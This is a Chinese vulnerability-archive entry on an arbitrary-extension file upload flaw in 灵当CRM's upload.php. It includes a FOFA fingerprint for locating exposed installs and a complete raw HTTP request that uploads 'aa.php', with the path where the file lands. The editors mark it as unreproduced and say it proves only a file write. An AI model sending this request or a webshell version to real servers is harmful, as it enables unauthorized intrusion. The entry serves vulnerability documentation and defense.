---
source: "wy876 漏洞文库"
title: "灵当CRM upload.php任意后缀上传"
product: "灵当CRM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "日期目录recordData，版本未知"
prerequisites: "无Cookie示例，鉴权未知"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ilggltsrlmmqkw8h"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%81%B5%E5%BD%93CRM/%E7%81%B5%E5%BD%93crmupload%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "body="
id: "vw-975a092ece1ee700ba2b89c3"
entity_id: "ve-975a092ece1ee700ba2b89c3"
schema_version: "1"
---

# 灵当CRM upload.php任意后缀上传

## 条目说明

- 对象与具体问题：灵当CRM；upload.php任意后缀上传
- 版本、配置及部署条件：日期目录recordData，版本未知
- 认证与权限前提：无Cookie示例，鉴权未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 内容234561只证明文件写入，不证明PHP执行/服务器权限
- 日期说明有价值但需时区/返回路径，当前无响应/源码/修复
- FOFA同Markdown污染；落盘检测需清理，不能因纯文本就忽视持久文件

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
灵当CRM 是一款企业级客户关系管理软件。它旨在帮助企业管理客户信息、销售流程、市场营销活动和客户服务等。灵当crm存在任意文件上传漏洞，攻击者可以通过该漏洞写入恶意文件获取服务器权限。

## 二、影响版本
+ 灵当crm

## 三、资产测绘
+ fofa`body="[http://localhost:8088/crm/index.php"](http://localhost:8088/crm/index.php") && body="ldcrm.base.js"`
+ 特征


## 四、漏洞复现
```http
POST /crm/upload.php HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----234561
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Length: 149

------234561
Content-Disposition: form-data; name="file"; filename="aa.php"
Content-Type: application/octet-stream

234561
------234561--
```

> 请求长度说明：原资料 Content-Length 为 149；保留原始标头；其数值未据实际请求体重新计算或验证。


```plain
/crm/recordData/20240824/aa.php
其中20240824为当前时间
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ilggltsrlmmqkw8h>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
